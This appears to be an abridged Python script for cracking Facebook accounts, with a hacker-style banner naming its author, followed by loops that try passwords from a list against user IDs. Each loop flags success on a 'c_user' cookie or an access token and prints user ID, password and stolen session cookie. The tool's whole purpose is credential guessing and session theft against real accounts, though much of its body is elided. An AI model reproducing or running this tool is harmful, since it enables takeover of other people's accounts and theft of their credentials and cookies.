...
def logo():
	...
	print("""\x1b[0;32m╔════════════════════════════════════════════╗
jalan \x1b[0;33m║WELCOME TO MY TOOLS  [🔥NAZIR X TOOR ᴱᴰᴵᵀᴼᴿ🔥].  ║
jalan \x1b[0;33m║       #TOOL AUTHOR [AJMALO]. ║
jalan \x1b[0;33m╚════════════════════════════════════════════╝
\x1b[0;33m ---------------------------------------------
\x1b[0;33m╔════════════════════════════════════════════╗
\x1b[0;33m║TOOR AJMALO ᴴᴬᶜᴷᴱᴿ 𝙸𝚖 𝚗𝚘𝚝 𝚋𝚊𝚍 𝚒𝚖 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚍𝚊𝚍 ║
\x1b[0;33m║#FACEBOOK : NAME [NAZIR XE AJMAL.         II ].       ║
\x1b[0;33m║#GITHUB : https://github.com/NAZIR 5.                      ║
\x1b[0;33m║#WHATSAPP : 0302**********                   ║
\x1b[0;33m╚════════════════════════════════════════════╝""")
...
while (loop == 'true'):
	...
	try:
		...
		requests.get("https://www.facebook.com/ajmal.shah41")
...
def cek_ttl_cp(uid, pw):
	...
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[AJMAL-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;95m[AJMAL-CP] %s|%s\033[0;92m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[NAZIR-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[AJMAL-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[NAZIR-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[AJMAL-CP] %s|%s\033[0;91m        "%(uid, pw))
